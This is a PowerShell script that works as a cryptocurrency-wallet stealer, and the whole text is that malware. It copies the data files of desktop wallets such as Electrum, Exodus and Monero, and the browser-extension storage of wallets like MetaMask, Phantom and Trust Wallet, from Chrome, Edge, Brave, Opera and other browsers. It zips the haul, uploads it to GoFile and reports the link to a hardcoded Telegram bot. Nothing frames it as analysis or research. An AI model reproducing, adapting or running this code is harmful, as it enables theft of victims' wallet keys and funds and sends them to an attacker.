# Define the temporary directory for output
$tempDir = [System.IO.Path]::GetTempPath()
$folder_crypto = Join-Path -Path $tempDir -ChildPath "walletinfo"

# Ensure the walletinfo folder is created fresh every time
if (Test-Path $folder_crypto) {
    Remove-Item -Path $folder_crypto -Recurse -Force
}
New-Item -ItemType Directory -Path $folder_crypto -Force | Out-Null

# Initialize an array to keep track of collected wallets
$collectedWallets = @()

# Function to handle local crypto wallets
function Local_Crypto_Wallets {
    $wallet_paths = @{
        "Armory"           = Join-Path $env:appdata      "\Armory\*.wallet"
        "Atomic"           = Join-Path $env:appdata      "\Atomic\Local Storage\leveldb"
        "Bitcoin"          = Join-Path $env:appdata      "\Bitcoin\wallets"
        "Bytecoin"         = Join-Path $env:appdata      "\bytecoin\*.wallet"
        "Coinomi"          = Join-Path $env:localappdata "Coinomi\Coinomi\wallets"
        "Dash"             = Join-Path $env:appdata      "\DashCore\wallets"
        "Electrum"         = Join-Path $env:appdata      "\Electrum\wallets"
        "Ethereum"         = Join-Path $env:appdata      "\Ethereum\keystore"
        "Exodus"           = Join-Path $env:appdata      "\Exodus\exodus.wallet"
        "Guarda"           = Join-Path $env:appdata      "\Guarda\Local Storage\leveldb"
        "com.liberty.jaxx" = Join-Path $env:appdata      "\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb"
        "Litecoin"         = Join-Path $env:appdata      "\Litecoin\wallets"
        "MyMonero"         = Join-Path $env:appdata      "\MyMonero\*.mmdb"
        "Monero GUI"       = Join-Path $env:appdata      "Documents\Monero\wallets\"
        "WalletWasabi"     = Join-Path $env:appdata      "WalletWasabi\Client\Wallets"
    }
    
    # Zephyr Wallet Handling
    $zephyr_path = Join-Path $env:appdata "\Zephyr\wallets"
    $zephyr_dest = Join-Path $folder_crypto "Zephyr"
    if (Test-Path $zephyr_path) {
        New-Item -ItemType Directory -Path $zephyr_dest -Force | Out-Null
        Get-ChildItem -Path $zephyr_path -Filter "*.keys" -Recurse | Copy-Item -Destination $zephyr_dest -Force
        $collectedWallets += "Zephyr (Local)"
    }

    # Copy each wallet if found
    foreach ($wallet in $wallet_paths.GetEnumerator()) {
        $sourcePath = $wallet.Value
        $walletName = $wallet.Key
        if (Test-Path $sourcePath) {
            $destination = Join-Path -Path $folder_crypto -ChildPath $walletName
            New-Item -ItemType Directory -Path $destination -Force | Out-Null
            Copy-Item -Path $sourcePath -Recurse -Destination $destination -Force
            $collectedWallets += "$walletName (Local)"
        }
    }
}
Local_Crypto_Wallets

# Function to handle browser wallets
function Browser_Wallets {
    $browserPaths = @{
        "Brave"       = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data"
        "Chrome"      = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
        "Chromium"    = Join-Path $env:LOCALAPPDATA "Chromium\User Data"
        "Edge"        = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data"
        "EpicPrivacy" = Join-Path $env:LOCALAPPDATA "Epic Privacy Browser\User Data"
        "Iridium"     = Join-Path $env:LOCALAPPDATA "Iridium\User Data"
        "Opera"       = Join-Path $env:APPDATA      "Opera Software\Opera Stable"
        "OperaGX"     = Join-Path $env:APPDATA      "Opera Software\Opera GX Stable"
        "Vivaldi"     = Join-Path $env:LOCALAPPDATA "Vivaldi\User Data"
        "Yandex"      = Join-Path $env:LOCALAPPDATA "Yandex\YandexBrowser\User Data"
    }
    
    $walletDirs = @{
        "dlcobpjiigpikoobohmabehhmhfoodbb" = "Argent X"
        "fhbohimaelbohpjbbldcngcnapndodjp" = "Binance Chain Wallet"
        "jiidiaalihmmhddjgbnbgdfflelocpak" = "BitKeep Wallet"
        "bopcbmipnjdcdfflfgjdgdjejmgpoaab" = "BlockWallet"
        "odbfpeeihdkbihmopkbjmoonfanlbfcl" = "Coinbase"
        "hifafgmccdpekplomjjkcfgodnhcellj" = "Crypto.com"
        "kkpllkodjeloidieedojogacfhpaihoh" = "Enkrypt"
        "mcbigmjiafegjnnogedioegffbooigli" = "Ethos Sui"
        "aholpfdialjgjfhomihkjbmgjidlcdno" = "ExodusWeb3"
        "hpglfhgfnhbgpjdenjgmdgoeiappafln" = "Guarda"
        "dmkamcknogkgcdfhhbddcghachkejeap" = "Keplr"
        "afbcbjpbpfadlkmhmclhkeeodmamcflc" = "MathWallet"
        "nkbihfbeogaeaoehlefnkodbefgpgknn" = "Metamask"
        "ejbalbakoplchlghecdalmeeeajnimhm" = "Metamask2"
        "mcohilncbfahbmgdjkbpemcciiolgcge" = "OKX"
        "jnmbobjmhlngoefaiojfljckilhhlhcj" = "OneKey"
        "bfnaelmomeimhlpmgjnjophhpkkoljpa" = "Phantom"
        "fnjhmkhhmkbjkkabndcnnogagogbneec" = "Ronin"
        "lgmpcpglpngdoalbgeoldeajfclnhafa" = "SafePal"
        "mfgccjchihfkkindfppnaooecgfneiii" = "TokenPocket"
        "nphplpgoakhhjchkkhmiggakijnkhfnd" = "Ton"
        "ibnejdfjmmkpcnlpebklmnkoeoihofec" = "TronLink"
        "egjidjbpglichdcondbcbdnbeeppgdph" = "Trust Wallet"
        "amkmjjmmflddogmhpjloimipbofnfjih" = "Wombat"
        "heamnjbnflcikcggoiplibfommfbkjpj" = "Zeal"
    }

    foreach ($browser in $browserPaths.GetEnumerator()) {
        $browserName = $browser.Key
        $browserPath = $browser.Value
        if (Test-Path $browserPath) {
            Get-ChildItem -Path $browserPath -Recurse -Directory -Filter "Local Extension Settings" -ErrorAction SilentlyContinue | ForEach-Object {
                $localExtensionsSettingsDir = $_.FullName
                foreach ($walletDir in $walletDirs.GetEnumerator()) {
                    $walletKey = $walletDir.Key
                    $walletName = $walletDir.Value
                    $extensionPath = Join-Path $localExtensionsSettingsDir $walletKey
                    if (Test-Path $extensionPath) {
                        if (Get-ChildItem $extensionPath -ErrorAction SilentlyContinue) {
                            try {
                                $wallet_browser = "$walletName ($browserName)"
                                $walletDirPath = Join-Path $folder_crypto $wallet_browser
                                New-Item -ItemType Directory -Path $walletDirPath -Force | Out-Null
                                Copy-Item -Path $extensionPath -Destination $walletDirPath -Recurse -Force
                                $locationFile = Join-Path $walletDirPath "Location.txt"
                                $extensionPath | Out-File -FilePath $locationFile -Force
                                Add-Content -Path (Join-Path $folder_crypto "OperationLog.txt") -Value "[!] Copied $walletName wallet from $extensionPath to $walletDirPath"
                                $collectedWallets += "$walletName ($browserName)"
                            }
                            catch {
                                Add-Content -Path (Join-Path $folder_crypto "OperationLog.txt") -Value "[!] Failed to copy $walletName wallet from $extensionPath"
                            }
                        }
                    }
                }
            }
        }
    }
}
Browser_Wallets

# Create zip file with walletinfo folder
$zipFilePath = Join-Path $tempDir "walletinfo.zip"
if (Test-Path $zipFilePath) {
    Remove-Item -Path $zipFilePath -Force
}
Compress-Archive -Path $folder_crypto -DestinationPath $zipFilePath -Force

# Upload to GoFile and send Telegram message
$gofileUploadUrl = "https://store1.gofile.io/uploadFile"
$botToken = "7222925359:AAELEDUZVKyeuVeSjltBb6dERlLGEEE3fjM"
$chatId = "6395412192"

try {
    # Upload the zip file to GoFile
    $webClient = New-Object System.Net.WebClient
    $uploadResponse = $webClient.UploadFile($gofileUploadUrl, $zipFilePath)
    $responseBody = [System.Text.Encoding]::UTF8.GetString($uploadResponse)
    
    Write-Host "[!] Response Body: $responseBody" -ForegroundColor Yellow
    
    # Parse the JSON response
    $responseObject = $responseBody | ConvertFrom-Json
    if ($responseObject.status -eq "ok") {
        $downloadLink = $responseObject.data.downloadPage
        Write-Host "[!] File Uploaded Successfully: $downloadLink" -ForegroundColor Green
        
        # Send the download link and wallet info to Telegram
        $message = "Wallets collected successfully. Download it from: $downloadLink`nCollected Wallets:`n$($collectedWallets -join "`n")"
        $telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage"
        $messageContent = @{
            chat_id = $chatId
            text    = $message
        }

        $telegramResponse = Invoke-RestMethod -Uri $telegramUrl -Method Post -Body $messageContent
        Write-Host "[!] Message sent to Telegram." -ForegroundColor Green
    } else {
        Write-Host "[!] Upload Failed: $($responseObject.message)" -ForegroundColor Red
    }
}
catch {
    Write-Host "[!] An error occurred: $_" -ForegroundColor Red
}
